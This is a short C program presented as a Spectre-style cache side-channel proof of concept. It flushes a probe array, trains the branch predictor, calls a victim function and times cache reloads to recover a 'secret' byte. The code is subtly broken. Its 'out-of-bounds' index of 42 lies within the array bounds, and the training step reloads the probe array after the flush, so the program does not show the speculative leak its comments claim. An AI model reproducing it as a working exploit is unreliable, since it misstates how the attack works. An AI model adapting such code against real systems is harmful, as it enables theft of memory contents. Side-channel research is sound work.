#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h> // For _mm_clflush and __rdtscp

#define ARRAY_A_SIZE (256 * 4096)
#define CACHE_HIT_THRESHOLD 80

uint8_t Array_A[ARRAY_A_SIZE];
uint8_t Array_Victim[256];
int Array_Victim_Size = 256;
int T[256];

// Flush Array_A from cache
void flush_side_channel() {
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&Array_A[i * 4096]);
    }
}

// Train the branch predictor
void train_branch_predictor() {
    volatile int junk = 0;
    for (int i = 0; i < 30; i++) {
        if (i < Array_Victim_Size) {
            junk ^= Array_A[Array_Victim[i] * 4096];
        }
    }
}

// Victim function
void victim_function(size_t x) {
    if (x < Array_Victim_Size) {
        uint8_t y = Array_Victim[x];
        volatile uint8_t temp = Array_A[y * 4096];
    }
}

// Measure access time
int measure_access_time(uint8_t *addr) {
    unsigned int junk = 0;
    uint64_t start = __rdtscp(&junk);
    volatile uint8_t tmp = *addr;
    uint64_t end = __rdtscp(&junk);
    return (int)(end - start);
}

int main() {
    // Initialize arrays
    for (int i = 0; i < 256; i++) {
        Array_Victim[i] = 1; // Dummy value
    }
    Array_Victim[42] = 123; // Secret at index 42

    flush_side_channel();
    train_branch_predictor();

    // Attack: Out-of-bounds access
    size_t malicious_x = (size_t)(&Array_Victim[42] - Array_Victim); // 42

    // Speculative execution
    victim_function(malicious_x);

    // Reload Array_A to recover the secret byte
    for (int i = 0; i < 256; i++) {
        T[i] = measure_access_time(&Array_A[i * 4096]);
    }

    // Find the index with the lowest access time
    int recovered_byte = -1, min_time = 1000;
    for (int i = 0; i < 256; i++) {
        if (T[i] < min_time) {
            min_time = T[i];
            recovered_byte = i;
        }
    }

    printf("Recovered secret byte: %d\n", recovered_byte);
    return 0;
}